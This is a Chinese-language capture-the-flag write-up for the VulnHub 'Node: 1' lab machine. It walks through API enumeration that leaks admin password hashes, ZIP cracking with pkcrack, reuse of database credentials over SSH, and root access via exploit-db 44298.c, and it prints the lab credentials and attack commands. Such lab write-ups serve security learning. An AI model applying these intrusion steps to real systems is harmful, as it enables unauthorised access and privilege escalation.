---
title: "VulnHub #Node:1"
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2018-10-31 16:38:17
categories:
  - Writeups
  - VulnHub
thumbnailImage: cover.png
keywords:
  - vulnhub
  - writeup
  - node
tags:
  - Writeups
---

Official website: [Node: 1 ~ VulnHub](https://www.vulnhub.com/entry/node-1,252/)

<!-- more -->

## info

```
Nmap scan report for 192.168.56.101
Host is up (0.00031s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:A2:8A:95 (Oracle VirtualBox virtual NIC)
```

`22/tcp` SSH 服務目前沒有登錄資訊暫且擱置，`3000/tcp` 是一個網站，得從這裡著手。

## Login

把 Bur Suite 接起來以後觀察網站的封包，發現一些有意思的 API，且此網站為 `Node.js express` 框架，基本上只有一個登入的功能，推測應該要以管理員身份登入才能得到進一步的資訊。`/assets/js/app/` 裡有不少 JavaScript 的 code 也可以幫助你找到這些 API 路徑。

`/api/users/latest` 會回傳三個使用者的帳號及 SHA256 的密碼，Google 就可以找到 decrypt 的明文，不過一般使用者帳號並沒有用處，目標是取得 admin 的帳號並登入後台。

嘗試不同的 API 時發現`/api/users`會回傳所有的使用者資訊，於是得到具有管理權限的帳號 `myP14ceAdm1nAcc0uNT` 及 SHA256 的密碼 `dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af`，一樣直接 Google 明文後即可成功登入。

![panel](panel.png)

後台介面唯一的功能便是下載網站的備份檔，下載下來是個純文字檔，觀察一下即可發現是 base64 編碼，decode 以後再次確認檔案類型發現是個有密碼的 ZIP 壓縮檔。

```
$ file myplace.backup
myplace.backup: ASCII text, with very long lines, with no line terminators

$ echo myplace.backup | base64 --decode > decode

$ file decode
decode: Zip archive data, at least v1.0 to extract
```

## Decrypt Zip File

如果能夠解開這個壓縮檔，便可以進行 code review 去尋找其他潛在的漏洞。我使用 `pkcrack` 來還原加密的壓縮檔，只要我們能有一個同樣的檔案存在在壓縮檔內，便可以透過 `pkcrack` 去解密，於是我下載了 `home.html` 這個模板並壓縮成 `key.zip`，使用 `binwalk` 來確認 `home.html` 的路徑，便成功的還原出 `result.zip`，可以解壓縮進行更多的檢視了。

```
$ binwalk decode.zip | grep home.html
$ wget http://192.168.56.101:3000/partials/home.html
$ zip key.zip home.html
$ pkcrack -d result.zip -P key.zip -c  "var/www/myplace/static/partials/home.html" -C decode.zip -p home.html
```

## Code Review

Code review 會發現 mongoDB 的登錄資訊為 `mark:5AYRft73VtFpc84k`，嘗試登陸 SSH 成功，可是並未具有 root 權限，並發現第一個 flag 為 `/home/tom/user.txt`，必須設法提升權限。

## Local Privilege Escalation

看了一下目錄底下沒有其他檔案以後，決定將目標轉移到本地提權上。首先檢查 kernel 相關資訊並使用 `searchsploit` 來尋找相關的 payload。

![searchsploit](searchsploit.png)

```
$ uname -a
Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

$ searchsploit linux 4.4.0
// 發現 exploits/linux/local/44298.c 符合條件，可以試試
```

找到了可能可行的 payload 以後，我們已經有 SSH 的登錄資訊，可以使用 `scp` 來把檔案上傳至靶機內並編譯執行，即可成功取得 root 權限並且拿到兩把 flag。

```
$ scp /usr/share/exploitdb/exploits/linux/local/44298.c mark@192.168.56.101:/tmp/exploit.c
```

![exploit](exploit.png)
